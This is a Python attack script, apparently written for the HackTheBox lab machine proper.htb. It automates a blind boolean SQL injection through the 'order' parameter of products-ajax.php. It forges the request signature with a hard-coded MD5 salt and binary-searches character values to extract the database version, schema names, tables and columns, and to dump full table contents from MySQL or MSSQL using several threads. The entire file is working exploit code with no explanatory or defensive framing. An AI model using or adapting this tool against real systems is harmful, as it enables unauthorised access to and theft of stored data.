import requests
import sys
import concurrent.futures
import hashlib
from bs4 import BeautifulSoup

def inject(payload): ## function that returns True in the case of a success condition
	url = "http://proper.htb:80/products-ajax.php"
	inj = fr"(SELECT (CASE WHEN ({payload}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))-- -"
	h = hashlib.md5(f"hie0shah6ooNoim{inj}".encode()).hexdigest()
	r = requests.get(url, params={"order": inj, "h": h})
	if r.status_code == 500:
		return False
	return True
	
	
def extract_data(data, dbms=None, database=None, table=None, column=None, order=None, thread=0):
	if data == "version":
		query = r"SELECT @@VERSION"
	elif data == "dbs":
		if dbms == "MSSQL":
			query = fr"SELECT db_name({thread})"
		elif dbms == "MYSQL":
			query = fr"SELECT concat(schema_name) FROM information_schema.schemata ORDER BY concat(schema_name) LIMIT {thread},1"
		else:
			print("Dbms must be MYSQL or MSSQL")
			sys.exit()
	elif data == "tables":
		if dbms == "MSSQL":
			query = fr"SELECT name FROM {database}..sysobjects WHERE xtype='U' ORDER BY name OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
		if dbms == "MYSQL":
			query = fr"SELECT concat(table_name) FROM information_schema.tables WHERE table_schema='{database}' ORDER BY concat(table_name) LIMIT {thread},1"
	elif data == "columns":
		if dbms == "MSSQL":
			query = fr"SELECT column_name FROM {database}.information_schema.COLUMNS WHERE table_name='{table}' ORDER BY 1 ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
		if dbms == "MYSQL":
			query = fr"SELECT concat(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY concat(column_name) LIMIT {thread},1"
	elif data == "dump":
		if dbms == "MSSQL":
			query = fr"SELECT CAST({column} AS VARCHAR(4000)) FROM {database}..{table} ORDER BY {order} ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
		if dbms == "MYSQL":
			query = fr"SELECT {column} FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"
	skeleton = r"ASCII(SUBSTRING(({}),{},1)) <={}"
	current_char = 1
	output = ""
	done = False
	while True:
		maximum = 127
		minimum = 32
		while True:
			current = minimum + ((maximum - minimum) // 2)
			payload = skeleton.format(query, current_char, current)
			if inject(payload):
				maximum = current
				if maximum == minimum:
					if maximum < 32 or minimum > 127:
						done = True
						break
					output += chr(maximum)
					current_char += 1
					break
			else:
				if maximum == minimum:
					done = True
					break
				minimum = current + 1
		if done:
			break
		if data == "version":
			print("\r" + output, end="", flush=True)
	if data == "version":
		print("\n")
	if data == "dump":
		return [thread+1, output]
	return output
	
		
def process_input(database=None, table=None, column=None):

	if len(sys.argv) == 1:
		extract_data("version")
		return
		
	if len(sys.argv) == 2:
		data = "dbs"
		dbms = sys.argv[1].upper()
		
	if len(sys.argv) == 3:
		data = "tables"
		dbms = sys.argv[1].upper()
		database = sys.argv[2]
		
	if len(sys.argv) == 4:
		data = "columns"
		dbms = sys.argv[1].upper()
		database = sys.argv[2]
		table = sys.argv[3]
		
	if len(sys.argv) == 5:
		data = "dump"
		dbms = sys.argv[1].upper()
		database = sys.argv[2]
		table = sys.argv[3]
		columns = sys.argv[4].split(",")
		dump = {}
		
	loc = 0
	done = False
	while not done:
		with concurrent.futures.ThreadPoolExecutor() as executor:
			threads = list(range(loc,loc+5))
			if data == "dump":
				all_output = [[executor.submit(extract_data, data, database=database, dbms=dbms, table=table, column=i, order=columns[0], thread=t) for t in threads] for i in columns]
			else:
				output = [executor.submit(extract_data, data, database=database, dbms=dbms, table=table, column=column, thread=t) for t in threads]
				
			if data == "dump":
				for x in all_output:
					for i in concurrent.futures.as_completed(x):
						if i.result()[1]:
							if i.result()[0] in dump:
								dump[i.result()[0]].append(i.result()[1])
							else:
								dump[i.result()[0]] = [i.result()[1]]
						else:
							done = True
				for i in threads:
					if i+1 in dump:
						print("    ".join(dump[i+1]))	
				
			else:
				for i in concurrent.futures.as_completed(output):
					if i.result():						
						print(i.result())
					else:
						done = True
		loc += 5

def main():
	if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
		print("Usage python3 blindmysql.py <dbms> <database> <table> <comma separated columns> (Use fewer arguments to extract metadata)")
		return
	process_input()
	
if __name__ == "__main__":
	main()
